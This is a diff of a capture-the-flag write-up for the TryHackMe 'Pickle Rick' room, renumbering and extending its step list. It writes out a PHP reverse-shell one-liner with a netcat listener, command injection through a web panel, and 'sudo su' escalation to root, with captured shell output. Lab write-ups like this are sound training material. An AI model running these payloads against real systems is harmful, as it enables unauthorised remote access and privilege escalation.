@@ -170,20 +170,24 @@ Wubbalubbadubdub
 
 # Vulnerability Identification
 > Command Injection
-11. `sudo -l` to list the sudo privileges assigned to the user, which turns out that the current user we're logged in as can ran any command as root
-12. `php --version` to confirm that this server does in fact run PHP, which it does
+11. `ls` to list the available files and directories that are in the current directory that we're in
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Panel%20-%20ls.png)
+12. `cat {SECRET INGREDIENT FILE1}.txt` to display the contents of the **Sup3rS3cretP1ckl3Ingred.txt** file, which ended up displayed an error saying the the command is disabled
+![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Command%20Disabled.png)
+13. `sudo -l` to list the sudo privileges assigned to the user so that we can attempt to spawn a reverse shell, which turned out that the current user we're logged in as can ran any command as root
+14. `php --version` to confirm that this server does in fact run PHP, which it does
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/php%20--version.png)
-13. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"` to launch Firefox and redirect it to this Github repository containing commands that we potentially inject into the Command Panel to create a reverse shell
+15. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"` to launch Firefox and redirect it to this Github repository containing commands that we potentially inject into the Command Panel to create a reverse shell
 
 # Vulnerability Exploitation
 > Reverse Shell
-14. `nc -lnvp {PORT NUMBER}` to open up a Netcat listener on the specified unoccupied port on our attack machine
+16. `nc -lnvp {PORT NUMBER}` to open up a Netcat listener on the specified unoccupied port on our attack machine
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvnp 9999
 listening on [any] 9999 ...
 ```
-15. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'` to establish a network socket connection to our attack machine on our active Netcal listener, and then execute the shell command to spawn in an interactive shell on that machine, which successfully connected back to our active Netcat listener and create a reverse shell
+17. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");'` to establish a network socket connection to our attack machine on our active Netcal listener, and then execute the shell command to spawn in an interactive shell on that machine, which successfully connected back to our active Netcat listener and create a reverse shell
 ![](https://github.com/KnowCybersecurity/TryHackMe-Writeups/blob/main/TryHackMe%20CTF%20Writeups/Assets/THM%20-%20Pickle%20Rick/Reverse%20Shell%20Payload.png)
 ```bash
 ┌──(kali㉿kali)-[~]
@@ -193,8 +197,8 @@ connect to [10.6.54.63] from (UNKNOWN) [10.10.29.218] 53980
 /bin/sh: 0: can't access tty; job control turned off
 $ 
 ```
-16. `ls` to list all the available files and directories that are in the current directory that we're in
-17. `cat {SECRET INGREDIENT FILE1}.txt` to display the contents of the **Sup3rS3cretP1ckl3Ingred.txt** file, which displayed the first ingredient that we were looking for in this room
+18. `ls` to list all the available files and directories that are in the current directory that we're in
+19. `cat {SECRET INGREDIENT FILE1}.txt` to display the contents of the **Sup3rS3cretP1ckl3Ingred.txt** file, which displayed the first ingredient that we were looking for in this room
 ```bash
 Sup3rS3cretPickl3Ingred.txt
 assets
@@ -209,13 +213,13 @@ robots.txt
 $ cat Sup3rS3cretPickl3Ingred.txt               
 mr. meeseek hair                                                                               
 ```
-18. `pwd` to display where we currently are onto the terminal
+20. `pwd` to display where we currently are onto the terminal
 ```bash
 $ pwd
 /var/www/html
 ```
-19. `ls /` to list the available files and directories that are in the filesystem's root directory
-20. `ls /home` to list the available files and directories that are in the **/home** directory, which showed us two directories: **rick** and **ubuntu**
+21. `ls /` to list the available files and directories that are in the filesystem's root directory
+22. `ls /home` to list the available files and directories that are in the **/home** directory, which showed us two directories: **rick** and **ubuntu**
 ```bash
 $ cd /home
 ```
@@ -224,9 +228,9 @@ $ ls
 rick
 ubuntu
 ```
-21. `cd /home/rick` to change to the **/home/rick** directory
-22. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **second ingredients** file
-23. `cat '{SECRET INGREDIENT FILE2}.txt'` to display the contents of the **second ingredients** file onto our terminal, which displayed the second ingredient that we were looking for in this room
+23. `cd /home/rick` to change to the **/home/rick** directory
+24. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **second ingredients** file
+25. `cat '{SECRET INGREDIENT FILE2}.txt'` to display the contents of the **second ingredients** file onto our terminal, which displayed the second ingredient that we were looking for in this room
 ```bash
 $ cd rick
 ```
@@ -241,16 +245,16 @@ $ cat 'second ingredients'
 
 # Post Exploitation
 > Privilege Exploitation
-24. `cd /root` to try to change to the **/root** directory since we couldn't find our third and last ingredient that's left to find for this room, which denied our request since we don't have the necessary privileges to access this directory
+26. `cd /root` to try to change to the **/root** directory since we couldn't find our third and last ingredient that's left to find for this room, which denied our request since we don't have the necessary privileges to access this directory
 ```bash
 $ cd /root
 /bin/sh: 1: cd: can't cd to /root
 ```
-25. `sudo su` to switch to the root user, since we can do this without needing the root's password
-26. `whoami` to verify that we're now running as root
-27. `cd /root` to change to the **/root** directory, which we can now since we're running running with root privileges
-28. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **3rd.txt** file
-29. `cat {SECRET INGREDIENT FILE3}.txt` to display the contents of the **3rd.txt** file onto our terminal, which displayed the third and last ingredient that we were looking for in this room
+27. `sudo su` to switch to the root user, since we can do this without needing the root's password
+28. `whoami` to verify that we're now running as root
+29. `cd /root` to change to the **/root** directory, which we can now since we're running running with root privileges
+30. `ls` to list the available files and directories that are in the current directory that we're in, which showed us a **3rd.txt** file
+31. `cat {SECRET INGREDIENT FILE3}.txt` to display the contents of the **3rd.txt** file onto our terminal, which displayed the third and last ingredient that we were looking for in this room
 ```bash
 $ sudo su
 ```
@@ -285,24 +289,26 @@ fleeb juice
 7. `curl http://{TARGET IP}/robots.txt`
 8. `curl http://{TARGET IP}`
 9. `firefox "http://{TARGET IP}/login.php"`
-10. `sudo -l`
-11. `php --version`
-12. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"`
-13. `nc -lnvp {PORT NUMBER}`
-14. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
-15. `ls`
-16. `cat {SECRET INGREDIENT FILE1}.txt`
-17. `pwd`
-18. `ls /`
-19. `ls /home`
-20. `cd /home/rick`
-21. `ls`
-22. `cat '{SECRET INGREDIENT FILE2}.txt'`
-23. ` cd /root`
-24. `sudo su`
-25. `cd /root`
-26. `ls`
-27. `cat {SECRET INGREDIENT FILE3}.txt`
+10. `ls`
+11. `cat {SECRET INGREDIENT FILE1}.txt`
+12. `sudo -l`
+13. `php --version`
+14. `firefox "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"`
+15. `nc -lnvp {PORT NUMBER}`
+16. `php -r '$sock=fsockopen("{MACHINE IP}",{PORT NUMBER});exec("/bin/sh -i <&3 >&3 2>&3");`
+17. `ls`
+18. `cat {SECRET INGREDIENT FILE1}.txt`
+19. `pwd`
+20. `ls /`
+21. `ls /home`
+22. `cd /home/rick`
+23. `ls`
+24. `cat '{SECRET INGREDIENT FILE2}.txt'`
+25. ` cd /root`
+26. `sudo su`
+27. `cd /root`
+28. `ls`
+29. `cat {SECRET INGREDIENT FILE3}.txt`
 
 # Dissecting Comands
 `dirb http://{TARGET IP} -r /usr/share/dirb/wordlists/extensions_common.txt`
